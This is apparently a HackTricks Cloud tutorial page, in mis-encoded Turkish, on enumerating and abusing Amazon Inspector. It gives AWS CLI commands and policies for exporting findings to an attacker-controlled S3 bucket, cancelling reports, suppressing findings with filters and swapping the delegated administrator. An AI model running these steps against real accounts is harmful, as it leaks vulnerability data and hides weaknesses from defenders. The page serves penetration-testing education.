# AWS - Inspector Enum

{% hint style="success" %}
AWS Hacking'Ä± Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak **HackTricks** ve **HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek katkÄ±da bulunun.

</details>
{% endhint %}

## Inspector

Amazon Inspector, AWS ortamÄ±nÄ±zÄ±n gÃ¼venliÄŸini artÄ±rmayÄ± amaÃ§layan geliÅŸmiÅŸ, otomatik bir zayÄ±flÄ±k yÃ¶netimi hizmetidir. Bu hizmet, sÃ¼rekli olarak Amazon EC2 Ã¶rneklerini, Amazon ECR'deki konteyner gÃ¶rÃ¼ntÃ¼lerini, Amazon ECS'yi ve AWS Lambda iÅŸlevlerini zayÄ±flÄ±klar ve istenmeyen aÄŸ maruziyetleri aÃ§Ä±sÄ±ndan tarar. GÃ¼Ã§lÃ¼ bir zayÄ±flÄ±k istihbarat veritabanÄ±nÄ± kullanarak Amazon Inspector, ciddiyet seviyeleri ve iyileÅŸtirme Ã¶nerileri de dahil olmak Ã¼zere detaylÄ± bulgular saÄŸlar ve kuruluÅŸlarÄ±n gÃ¼venlik risklerini proaktif bir ÅŸekilde belirlemelerine ve ele almalarÄ±na yardÄ±mcÄ± olur. Bu kapsamlÄ± yaklaÅŸÄ±m, Ã§eÅŸitli AWS hizmetlerinde gÃ¼Ã§lÃ¼ bir gÃ¼venlik duruÅŸunu saÄŸlayarak uyumluluk ve risk yÃ¶netimine yardÄ±mcÄ± olur.

## Ana unsurlar

### Bulgular

Amazon Inspector'daki bulgular, EC2 Ã¶rneklerinin, ECR depolarÄ±nÄ±n veya Lambda iÅŸlevlerinin taranmasÄ± sÄ±rasÄ±nda keÅŸfedilen zayÄ±flÄ±klar ve maruziyetler hakkÄ±nda detaylÄ± raporlardÄ±r. Durumuna baÄŸlÄ± olarak, bulgular ÅŸu ÅŸekilde kategorize edilir:

- **Aktif**: Bulgular giderilmemiÅŸtir.
- **KapalÄ±**: Bulgular giderilmiÅŸtir.
- **BaskÄ±lanmÄ±ÅŸ**: Bulgular, bir veya daha fazla **baskÄ±lama kuralÄ±** nedeniyle bu durumla iÅŸaretlenmiÅŸtir.

Bulgular ayrÄ±ca aÅŸaÄŸÄ±daki Ã¼Ã§ tÃ¼re ayrÄ±lÄ±r:

- **Paket**: Bu bulgular, kaynaklarÄ±nÄ±zda yÃ¼klÃ¼ yazÄ±lÄ±m paketlerindeki zayÄ±flÄ±klarla ilgilidir. Ã–rnekler arasÄ±nda gÃ¼ncellenmemiÅŸ kÃ¼tÃ¼phaneler veya bilinen gÃ¼venlik sorunlarÄ± olan baÄŸÄ±mlÄ±lÄ±klar bulunur.
- **Kod**: Bu kategori, AWS kaynaklarÄ±nÄ±zda Ã§alÄ±ÅŸan uygulamalarÄ±n kodundaki bulgularÄ± iÃ§erir. YaygÄ±n sorunlar, gÃ¼venlik ihlallerine yol aÃ§abilecek kodlama hatalarÄ± veya gÃ¼vensiz uygulamalardÄ±r.
- **AÄŸ**: AÄŸ bulgularÄ±, saldÄ±rganlar tarafÄ±ndan sÃ¶mÃ¼rÃ¼lebilecek aÄŸ yapÄ±landÄ±rmalarÄ±ndaki potansiyel maruziyetleri tanÄ±mlar. Bunlar, aÃ§Ä±k portlar, gÃ¼vensiz aÄŸ protokolleri ve yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ gÃ¼venlik gruplarÄ±nÄ± iÃ§erir.

### Filtreler ve BaskÄ±lama KurallarÄ±

Amazon Inspector'daki filtreler ve baskÄ±lama kurallarÄ±, bulgularÄ± yÃ¶netmenize ve Ã¶nceliklendirmenize yardÄ±mcÄ± olur. Filtreler, ciddiyet veya kaynak tÃ¼rÃ¼ gibi belirli kriterlere gÃ¶re bulgularÄ± hassaslaÅŸtÄ±rmanÄ±za olanak tanÄ±r. BaskÄ±lama kurallarÄ±, dÃ¼ÅŸÃ¼k riskli kabul edilen belirli bulgularÄ± bastÄ±rmanÄ±za, zaten hafifletilmiÅŸ olmalarÄ±na veya baÅŸka Ã¶nemli bir nedenle aÅŸÄ±rÄ± yÃ¼klenmelerini Ã¶nlemenize olanak tanÄ±r, bu da gÃ¼venlik raporlarÄ±nÄ±zÄ± aÅŸÄ±rÄ± yÃ¼klemekten korur ve daha kritik konulara odaklanmanÄ±za olanak tanÄ±r.

### YazÄ±lÄ±m Malzeme Listesi (SBOM)

Amazon Inspector'daki YazÄ±lÄ±m Malzeme Listesi (SBOM), kÃ¼tÃ¼phaneler ve baÄŸÄ±mlÄ±lÄ±klar da dahil olmak Ã¼zere bir yazÄ±lÄ±m paketindeki tÃ¼m bileÅŸenleri detaylÄ± bir ÅŸekilde listeleyen dÄ±ÅŸa aktarÄ±labilir iÃ§ iÃ§e envanter listesidir. SBOM'lar, yazÄ±lÄ±m tedarik zincirine ÅŸeffaflÄ±k saÄŸlayarak daha iyi zayÄ±flÄ±k yÃ¶netimi ve uyumluluk saÄŸlar. AÃ§Ä±k kaynak ve Ã¼Ã§Ã¼ncÃ¼ taraf yazÄ±lÄ±m bileÅŸenleriyle iliÅŸkili riskleri tanÄ±mlamak ve hafifletmek iÃ§in Ã¶nemlidir.

## Ana Ã¶zellikler

### BulgularÄ± dÄ±ÅŸa aktar

Amazon Inspector, bulgularÄ± Amazon S3 Buckets, Amazon EventBridge ve AWS Security Hub'a dÄ±ÅŸa aktarma olanaÄŸÄ± sunar, bu da belirlenen zayÄ±flÄ±klarÄ±n ve maruziyetlerin ayrÄ±ntÄ±lÄ± raporlarÄ±nÄ± daha sonra analiz veya paylaÅŸÄ±m iÃ§in oluÅŸturmanÄ±za olanak tanÄ±r. Bu Ã¶zellik, CSV ve JSON gibi Ã§eÅŸitli Ã§Ä±ktÄ± biÃ§imlerini destekler, bÃ¶ylece diÄŸer araÃ§lar ve sistemlerle entegrasyonu kolaylaÅŸtÄ±rÄ±r. DÄ±ÅŸa aktarma iÅŸlevselliÄŸi, raporlara dahil edilecek verilerin Ã¶zelleÅŸtirilmesine olanak tanÄ±r, belirli kriterlere gÃ¶re bulgularÄ± filtrelemenizi saÄŸlar (Ã¶rneÄŸin ciddiyet, kaynak tÃ¼rÃ¼ veya tarih aralÄ±ÄŸÄ±) ve varsayÄ±lan olarak mevcut AWS BÃ¶lgesindeki tÃ¼m bulgularÄ± Aktif durumda iÃ§erir.

BulgularÄ± dÄ±ÅŸa aktarÄ±rken, verileri ÅŸifrelemek iÃ§in bir Anahtar YÃ¶netimi Servisi (KMS) anahtarÄ± gereklidir. KMS anahtarlarÄ±, dÄ±ÅŸa aktarÄ±lan bulgularÄ±n yetkisiz eriÅŸime karÅŸÄ± korunduÄŸundan emin olur, hassas zayÄ±flÄ±k bilgileri iÃ§in ek bir gÃ¼venlik katmanÄ± saÄŸlar.

### Amazon EC2 Ã¶rneklerini tarama

Amazon Inspector, Amazon EC2 Ã¶rneklerindeki zayÄ±flÄ±klarÄ± ve gÃ¼venlik sorunlarÄ±nÄ± tespit etmek iÃ§in gÃ¼Ã§lÃ¼ tarama yetenekleri sunar. Inspector, EC2 Ã¶rneÄŸinden Ã§Ä±karÄ±lan meta verileri, gÃ¼venlik uyarÄ±larÄ±ndan kurallarla karÅŸÄ±laÅŸtÄ±rarak paket zayÄ±flÄ±klarÄ±nÄ± ve aÄŸ eriÅŸilebilirlik sorunlarÄ±nÄ± Ã¼retir. Bu taramalar, hesabÄ±nÄ±zÄ±n **tarama modu** ayarlarÄ± yapÄ±landÄ±rmasÄ±na baÄŸlÄ± olarak **ajans tabanlÄ±** veya **ajanssÄ±z** yÃ¶ntemlerle gerÃ§ekleÅŸtirilebilir.

- **Ajans TabanlÄ±**: Derinlemesine taramalarÄ± gerÃ§ekleÅŸtirmek iÃ§in AWS Sistem YÃ¶neticisi (SSM) ajanÄ±nÄ± kullanÄ±r. Bu yÃ¶ntem, Ã¶zelliÄŸin doÄŸrudan Ã¶rneÄŸinden kapsamlÄ± veri toplama ve analizine izin verir.
- **AjanssÄ±z**: Ã–rneÄŸe ajan kurulumu gerektirmeyen hafif bir alternatif sunar, EC2 Ã¶rneÄŸinin her bir hacminin bir EBS anlÄ±k gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ oluÅŸturur, zayÄ±flÄ±klarÄ± arar ve ardÄ±ndan siler; tarama iÃ§in mevcut AWS altyapÄ±sÄ±nÄ± kullanÄ±r.

Tarama modu, EC2 taramalarÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in hangi yÃ¶ntemin kullanÄ±lacaÄŸÄ±nÄ± belirler:

- **Ajans TabanlÄ±**: Derinlemesine inceleme iÃ§in EC2 Ã¶rneklerine SSM ajanÄ± kurulumunu iÃ§erir.
- **Hybrid Tarama**: KapsamÄ± maksimize etmek ve performans etkisini en aza indirmek iÃ§in hem ajans tabanlÄ± hem de ajanssÄ±z yÃ¶ntemleri birleÅŸtirir. SSM ajanÄ±nÄ±n kurulu olduÄŸu EC2 Ã¶rneklerinde Inspector, ajans tabanlÄ± bir tarama gerÃ§ekleÅŸtirir ve SSM ajanÄ±n olmadÄ±ÄŸÄ± Ã¶rneklerde gerÃ§ekleÅŸtirilen tarama ajanssÄ±z olur.

BaÅŸka bir Ã¶nemli Ã¶zellik, EC2 Linux Ã¶rnekleri iÃ§in **derin inceleme**dir. Bu Ã¶zellik, EC2 Linux Ã¶rneklerinin yazÄ±lÄ±m ve yapÄ±landÄ±rmasÄ±nÄ±n detaylÄ± bir ÅŸekilde analizini sunar, iÅŸletim sistemi zayÄ±flÄ±klarÄ±, uygulama zayÄ±flÄ±klarÄ± ve yapÄ±landÄ±rma hatalarÄ± da dahil olmak Ã¼zere detaylÄ± zayÄ±flÄ±k deÄŸerlendirmeleri saÄŸlar, kapsamlÄ± bir gÃ¼venlik deÄŸerlendirmesi saÄŸlar. Bu, varsayÄ±lan olarak Amazon Inspector'Ä±n aÅŸaÄŸÄ±dakileri tarayacaÄŸÄ± ancak her Ã¼ye hesabÄ±nÄ±n 5 daha fazla Ã¶zel yol tanÄ±mlayabileceÄŸi ve her yetkilendirilmiÅŸ yÃ¶neticinin 10'a kadar tanÄ±mlayabileceÄŸi **Ã¶zel yollarÄ±n** incelemesi yoluyla baÅŸarÄ±lÄ±r:

- `/usr/lib`
- `/usr/lib64`
- `/usr/local/lib`
- `/usr/local/lib64`

### Amazon ECR konteyner gÃ¶rÃ¼ntÃ¼lerini tarama

Amazon Inspector, Amazon Elastic Container Registry (ECR) konteyner gÃ¶rÃ¼ntÃ¼lerinde paket zayÄ±flÄ±klarÄ±nÄ±n etkin bir ÅŸekilde tespit edilmesini saÄŸlayan gÃ¼Ã§lÃ¼ tarama yetenekleri sunar.

- **Temel Tarama**: Bu, konteyner gÃ¶rÃ¼ntÃ¼lerindeki bilinen iÅŸletim sistemi paketlerindeki zayÄ±flÄ±klarÄ± tanÄ±mlayan hÄ±zlÄ± ve hafif bir taramadÄ±r ve aÃ§Ä±k kaynak Clair projesinden standart bir kural kÃ¼mesini kullanÄ±r. Bu tarama yapÄ±landÄ±rmasÄ±yla, depolarÄ±nÄ±z itildiÄŸinde taranÄ±r veya manuel taramalar gerÃ§ekleÅŸtirilir.
- **GeliÅŸmiÅŸ Tarama**: Bu seÃ§enek, itme taramasÄ±na ek olarak sÃ¼rekli tarama Ã¶zelliÄŸini ekler. GeliÅŸmiÅŸ tarama, her konteyner gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n katmanlarÄ±nÄ±n derinlemesine incelenmesini saÄŸlar ve iÅŸletim sistemi paketlerinde ve programlama dilleri paketlerindeki zayÄ±flÄ±klarÄ± daha yÃ¼ksek doÄŸrulukla tanÄ±mlar. Hem temel gÃ¶rÃ¼ntÃ¼yÃ¼ hem de herhangi ek katmanlarÄ± analiz eder, potansiyel gÃ¼venlik sorunlarÄ±nÄ±n kapsamlÄ± bir gÃ¶rÃ¼nÃ¼mÃ¼nÃ¼ saÄŸlar.

### Amazon Lambda iÅŸlevlerini tarama

Amazon Inspector, AWS Lambda iÅŸlevleri ve katmanlarÄ± iÃ§in kapsamlÄ± tarama yetenekleri sunar, sunucu olmayan uygulamalarÄ±n gÃ¼venliÄŸini ve bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ saÄŸlar. Inspector, Lambda iÅŸlevleri iÃ§in iki tarama tÃ¼rÃ¼ sunar:

- **Lambda standart tarama**: Bu varsayÄ±lan Ã¶zellik, Lambda iÅŸlevinize ve katmanlarÄ±na eklenen uygulama paketi baÄŸÄ±mlÄ±lÄ±klarÄ±ndaki yazÄ±lÄ±m zayÄ±flÄ±klarÄ±nÄ± tanÄ±mlar. Ã–rneÄŸin, iÅŸleviniz python-jwt gibi bir kÃ¼tÃ¼phanenin bilinen bir zayÄ±flÄ±k sÃ¼rÃ¼mÃ¼nÃ¼ kullanÄ±yorsa, bir bulgu oluÅŸturur.
- **Lambda kod taramasÄ±**: Ã–zel uygulama kodunu gÃ¼venlik sorunlarÄ± aÃ§Ä±sÄ±ndan analiz eder, enjeksiyon hatalarÄ±, veri sÄ±zÄ±ntÄ±larÄ±, zayÄ±f ÅŸifreleme ve eksik ÅŸifreleme gibi zayÄ±flÄ±klarÄ± tespit eder. AlgÄ±lanan zayÄ±flÄ±klarÄ± vurgulayan kod parÃ§alarÄ±nÄ± yakalar, Ã¶rneÄŸin sabitlenmiÅŸ kimlik bilgileri gibi. Bulgular, sorunlarÄ± dÃ¼zeltmek iÃ§in detaylÄ± iyileÅŸtirme Ã¶nerileri ve kod parÃ§alarÄ±nÄ± iÃ§erir.
### **Ä°nternet GÃ¼venlik Merkezi (CIS) taramalarÄ±**

Amazon Inspector, Amazon EC2 Ã¶rnek iÅŸletim sistemlerini Ä°nternet GÃ¼venlik Merkezi (CIS) tarafÄ±ndan Ã¶nerilen en iyi uygulama Ã¶nerilerine karÅŸÄ± test etmek iÃ§in CIS taramalarÄ±nÄ± iÃ§erir. Bu taramalar, yapÄ±landÄ±rmalarÄ±n endÃ¼stri standardÄ± gÃ¼venlik temellerine uygun olup olmadÄ±ÄŸÄ±nÄ± saÄŸlar.

- **YapÄ±landÄ±rma**: CIS taramalarÄ±, sistem yapÄ±landÄ±rmalarÄ±nÄ±n belirli CIS Benchmark Ã¶nerilerine uygun olup uygun olmadÄ±ÄŸÄ±nÄ± deÄŸerlendirir; her kontrol, bir CIS kontrol kimliÄŸi ve baÅŸlÄ±ÄŸÄ±na baÄŸlÄ±dÄ±r.
- **YÃ¼rÃ¼tme**: Taramalar, Ã¶rnek etiketlerine ve belirlenen zamanlamalara dayalÄ± olarak gerÃ§ekleÅŸtirilir veya planlanÄ±r.
- **SonuÃ§lar**: Tarama sonuÃ§larÄ±, her Ã¶rneÄŸin gÃ¼venlik durumuna dair iÃ§gÃ¶rÃ¼ saÄŸlayarak hangi kontrollerin geÃ§tiÄŸini, atlandÄ±ÄŸÄ±nÄ± veya baÅŸarÄ±sÄ±z olduÄŸunu gÃ¶sterir.

## NumaralandÄ±rma
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
## SaldÄ±rÄ± SonrasÄ±

{% hint style="success" %}
Bir saldÄ±rganÄ±n bakÄ±ÅŸ aÃ§Ä±sÄ±ndan, bu hizmet saldÄ±rgana diÄŸer Ã¶rnekleri/container'larÄ± ele geÃ§irmesine yardÄ±mcÄ± olabilecek zayÄ±flÄ±klarÄ± ve aÄŸ maruziyetlerini bulmasÄ±na yardÄ±mcÄ± olabilir.

Ancak, bir saldÄ±rgan bu hizmeti de bozmaya ilgi duyabilir, bÃ¶ylece kurban zayÄ±flÄ±klarÄ± (tÃ¼mÃ¼ veya belirli olanlar) gÃ¶remez.
{% endhint %}

### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

Bir saldÄ±rgan zayÄ±flÄ±klarÄ±n detaylÄ± raporlarÄ±nÄ± veya yazÄ±lÄ±m faturalandÄ±rma malzemelerini (SBOM'lar) oluÅŸturabilir ve bunlarÄ± AWS ortamÄ±nÄ±zdan dÄ±ÅŸa aktarabilir. Bu bilgiler, belirli zayÄ±flÄ±klarÄ±, gÃ¼ncellenmemiÅŸ yazÄ±lÄ±mlarÄ± veya gÃ¼vensiz baÄŸÄ±mlÄ±lÄ±klarÄ± tanÄ±mlamak iÃ§in sÃ¶mÃ¼rÃ¼lebilir ve hedeflenmiÅŸ saldÄ±rÄ±lara olanak tanÄ±yabilir.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
AÅŸaÄŸÄ±daki Ã¶rnek, Amazon Inspector'dan tÃ¼m Aktif bulgularÄ± bir saldÄ±rgan tarafÄ±ndan kontrol edilen bir Amazon S3 Kova'ya ve bir saldÄ±rgan tarafÄ±ndan kontrol edilen bir Amazon KMS anahtarÄ±yla exfiltrate etmenin nasÄ±l yapÄ±lacaÄŸÄ±nÄ± gÃ¶stermektedir:

1. **Bir Amazon S3 Kova oluÅŸturun** ve ona bir politika ekleyin ki kurban Amazon Inspector'dan eriÅŸilebilir olsun:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Bir Amazon KMS anahtarÄ± oluÅŸturun** ve ona bir politika ekleyin ki kurbanÄ±n Amazon Inspector tarafÄ±ndan kullanÄ±labilir hale gelsin:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. **Raporlama bulgularÄ± oluÅŸturmak** iÃ§in komutu Ã§alÄ±ÅŸtÄ±rÄ±n ve dÄ±ÅŸa aktarÄ±n:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
- **Potansiyel Etki**: DetaylÄ± zayÄ±flÄ±k ve yazÄ±lÄ±m raporlarÄ±nÄ±n oluÅŸturulmasÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±, belirli zayÄ±flÄ±klar ve gÃ¼venlik aÃ§Ä±klarÄ±na dair iÃ§gÃ¶rÃ¼ler elde edilmesi.

### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

Bir saldÄ±rgan belirtilen zayÄ±flÄ±k raporunun veya SBOM raporunun oluÅŸturulmasÄ±nÄ± iptal edebilir, gÃ¼venlik ekiplerinin zayÄ±flÄ±klar ve yazÄ±lÄ±m malzeme listeleri (SBOM'lar) hakkÄ±nda zamanÄ±nda bilgi almasÄ±nÄ± engelleyebilir, gÃ¼venlik sorunlarÄ±nÄ±n tespitini ve giderilmesini geciktirebilir.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
- **Potansiyel Etki**: GÃ¼venlik izleme iÅŸlevinin bozulmasÄ± ve gÃ¼venlik sorunlarÄ±nÄ±n zamanÄ±nda tespit edilmesinin ve giderilmesinin engellenmesi.
### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

Bu izinlere sahip bir saldÄ±rgan, hangi zayÄ±flÄ±klarÄ±n ve gÃ¼venlik sorunlarÄ±nÄ±n bildirileceÄŸini veya bastÄ±rÄ±lacaÄŸÄ±nÄ± belirleyen filtreleme kurallarÄ±nÄ± manipÃ¼le edebilir (eylem **SUPPRESS** olarak ayarlanmÄ±ÅŸsa, bir bastÄ±rma kuralÄ± oluÅŸturulur). Bu, kritik zayÄ±flÄ±klarÄ± gÃ¼venlik yÃ¶neticilerinden gizleyebilir ve bu zayÄ±flÄ±klarÄ± tespit edilmeden daha kolay sÃ¶mÃ¼rmeyi saÄŸlayabilir. Bir saldÄ±rgan, Ã¶nemli filtreleri deÄŸiÅŸtirerek veya kaldÄ±rarak, sistemi gereksiz bulgularla doldurarak etkili gÃ¼venlik izleme ve yanÄ±tÄ± engelleyebilir.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
- **Potansiyel Etki**: Kritik zafiyetlerin gizlenmesi veya bastÄ±rÄ±lmasÄ±, veya sistemin gereksiz bulgularla doldurulmasÄ±.

### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

Bir saldÄ±rgan gÃ¼venlik yÃ¶netim yapÄ±sÄ±nÄ± Ã¶nemli Ã¶lÃ§Ã¼de bozabilir.

- Delege edilmiÅŸ yÃ¶netici hesabÄ±nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ±yla, saldÄ±rgan gÃ¼venlik ekibinin Amazon Inspector ayarlarÄ±na ve raporlarÄ±na eriÅŸmesini engelleyebilir.
- Yetkisiz bir yÃ¶netici hesabÄ±nÄ±n etkinleÅŸtirilmesi, saldÄ±rganÄ±n gÃ¼venlik yapÄ±landÄ±rmalarÄ±nÄ± kontrol etmesine olanak tanÄ±r, taramalarÄ± devre dÄ±ÅŸÄ± bÄ±rakabilir veya kÃ¶tÃ¼ niyetli faaliyetleri gizlemek iÃ§in ayarlarÄ± deÄŸiÅŸtirebilir.

{% hint style="warning" %}

Yetkisiz hesabÄ±n, delege edilen yÃ¶netici olabilmesi iÃ§in kurbanla aynÄ± Organizasyonda olmasÄ± gerekmektedir.

Yetkisiz hesabÄ±n delege edilen yÃ¶netici olabilmesi iÃ§in, meÅŸru delege edilen yÃ¶netici devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ktan sonra ve yetkisiz hesabÄ±n delege edilen yÃ¶netici olarak etkinleÅŸtirilmeden Ã¶nce, meÅŸru yÃ¶neticinin organizasyondan delege edilen yÃ¶netici olarak kaydÄ±nÄ±n silinmesi gerekmektedir. Bu, aÅŸaÄŸÄ±daki komutla yapÄ±labilir (**`organizations:DeregisterDelegatedAdministrator`** izni gereklidir): **`aws organizations deregister-delegated-administrator --account-id <meÅŸru-hesap-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**

{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
- **Potansiyel Etki**: GÃ¼venlik yÃ¶netiminin bozulmasÄ±.

### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

Bir saldÄ±rgan, bir Amazon Inspector organizasyonu iÃ§indeki Ã¼ye hesaplarÄ±nÄ±n iliÅŸkilendirilmesini manipÃ¼le edebilir. Yetkisiz hesaplarÄ± iliÅŸkilendirerek veya meÅŸru olanlarÄ± iliÅŸkilendirmeyerek, bir saldÄ±rgan gÃ¼venlik taramalarÄ±na ve raporlamaya hangi hesaplarÄ±n dahil edileceÄŸini kontrol edebilir. Bu, kritik hesaplarÄ±n gÃ¼venlik izlemesinden dÄ±ÅŸlanmasÄ±na yol aÃ§abilir ve saldÄ±rganÄ±n bu hesaplardaki zafiyetleri tespit edilmeden sÃ¶mÃ¼rmesine olanak tanÄ±yabilir.

{% hint style="warning" %}

Bu eylemin, yetkilendirilmiÅŸ yÃ¶netici tarafÄ±ndan gerÃ§ekleÅŸtirilmesi gerekmektedir.

{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
